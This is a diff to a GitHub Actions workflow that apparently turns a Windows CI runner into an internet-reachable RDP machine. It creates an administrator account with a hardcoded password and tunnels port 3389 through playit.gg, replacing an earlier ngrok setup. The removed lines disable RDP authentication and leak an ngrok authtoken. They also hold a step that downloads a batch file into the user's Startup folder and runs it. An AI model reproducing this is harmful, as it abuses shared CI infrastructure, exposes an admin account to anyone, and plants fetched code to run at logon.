@@ -1,4 +1,4 @@
-name: win 11
+name: win 11 playit rdp
 
 on:
   workflow_dispatch:
@@ -9,17 +9,13 @@ jobs:
     timeout-minutes: 350
 
     steps:
-      - name: Configure Core RDP Settings
+      - name: Enable RDP
         run: |
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
-          
-          netsh advfirewall firewall delete rule name="RDP-Global"
-          netsh advfirewall firewall add rule name="RDP-Global" dir=in action=allow protocol=TCP localport=3389
-          Restart-Service -Name TermService -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1 -Force
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 
-      - name: Create RDP User with Fixed Password
+      - name: Create RDP User
         run: |
           $password = "TechZoner@001"
           $securePass = ConvertTo-SecureString $password -AsPlainText -Force
@@ -29,85 +25,45 @@ jobs:
           Add-LocalGroupMember -Group "Administrators" -Member "RDP"
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
 
-      - name: Install and Start ngrok Tunnel
+      - name: Download and Start playit.gg Agent
         shell: powershell
         run: |
-          Write-Host "Installing ngrok via Chocolatey..."
-          choco install ngrok --no-progress -y
+          $playitDir = "C:\playit"
+          New-Item -ItemType Directory -Path $playitDir -Force | Out-Null
+          $playitExe = "$playitDir\playit.exe"
           
-          $ngrokPath = "C:\ProgramData\chocolatey\bin\ngrok.exe"
-          if (-not (Test-Path $ngrokPath)) {
-              $ngrokPath = "ngrok"
-          }
-
-          Write-Host "Authenticating ngrok..."
-          & $ngrokPath config add-authtoken "3GAmkQyZ4aTDXmW8gL8bAYj5fD3_7U3pzSH4fnHg4ReB2pfiB"
+          Write-Host "Downloading playit.gg agent..."
+          Invoke-WebRequest -Uri "https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-windows-x86_64.exe" -OutFile $playitExe -UseBasicParsing
           
-          Write-Host "Starting TCP Tunnel..."
-          Start-Process $ngrokPath -ArgumentList "tcp 3389" -WindowStyle Hidden
+          Write-Host "Starting playit agent..."
+          Start-Process -FilePath $playitExe -WorkingDirectory $playitDir -WindowStyle Hidden
           
-          $maxRetries = 12
-          $retryCount = 0
-          $publicUrl = $null
-          while ($retryCount -lt $maxRetries -and -not $publicUrl) {
-              Start-Sleep -Seconds 5
-              try {
-                  $response = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -TimeoutSec 5
-                  if ($response.tunnels.Count -gt 0) {
-                      $publicUrl = $response.tunnels[0].public_url
-                  }
-              } catch {
-                  Write-Host "API not ready yet, retrying... ($($retryCount + 1)/$maxRetries)"
+          Start-Sleep -Seconds 10
+          
+          Write-Host "`n==============================================="
+          Write-Host "PLAYIT.GG CLAIM INSTRUCTIONS"
+          Write-Host "1. Look for a claim URL in the log below (or check the playit.exe console window)."
+          Write-Host "2. Open that URL, log in / sign up, and claim this agent."
+          Write-Host "3. In the playit dashboard, create a TCP tunnel for port 3389."
+          Write-Host "4. Copy the public IP:PORT (e.g., 1.tcp.eu.playit.gg:12345) and use it in RDP."
+          Write-Host "===============================================`n"
+          
+          # Ajanın loglarını görünür kılmak için birkaç saniye bekle ve dosyaları kontrol et
+          Start-Sleep -Seconds 5
+          $logFiles = Get-ChildItem -Path $playitDir -Filter "*.log" -ErrorAction SilentlyContinue
+          if ($logFiles) {
+              foreach ($log in $logFiles) {
+                  Write-Host "--- $($log.Name) ---"
+                  Get-Content $log.FullName -Tail 50
               }
-              $retryCount++
-          }
-
-          if (-not $publicUrl) {
-              Write-Error "Could not reach ngrok API within 60 seconds. Tunnel may not have started."
-              exit 1
-          }
-
-          if ($publicUrl -match "tcp://(.+)") {
-              $rdpAddress = $Matches[1]
-              
-              Write-Host "`n==============================================="
-              Write-Host "🚀 RDP CONNECTION INFO"
-              Write-Host "Address (Computer): $rdpAddress"
-              Write-Host "Username: RDP"
-              Write-Host "Password: TechZoner@001"
-              Write-Host "===============================================\n"
           } else {
-              Write-Error "Unexpected tunnel URL format: $publicUrl"
-              exit 1
+              Write-Host "No log file yet. The claim URL should appear in the playit.exe console window."
+              Write-Host "If you cannot see it, the agent may need to be run interactively once."
           }
 
-      - name: Maintain Connection + Watch RDP User
+      - name: Keep Alive
         run: |
-          $rdpProfile = "C:\Users\RDP"
-          $startupPath = "$rdpProfile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-          $downloadUrl = "https://gitlab.com"
-          $downloadPath = "$startupPath\Downloads.bat"
-
           while ($true) {
-              if (Test-Path $rdpProfile) {
-                  try {
-                      if (-not (Test-Path $startupPath)) {
-                          New-Item -ItemType Directory -Path $startupPath -Force | Out-Null
-                      }
-                      Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -UseBasicParsing
-                      cmd /c $downloadPath
-                      break
-                  }
-                  catch {
-                      break
-                  }
-              }
-              else {
-                  Start-Sleep -Seconds 30
-              }
-          }
-
-          while ($true) {
-              Write-Host "[$(Get-Date)] RDP Active..."
+              Write-Host "[$(Get-Date)] RDP Active via playit.gg..."
               Start-Sleep -Seconds 300
           }
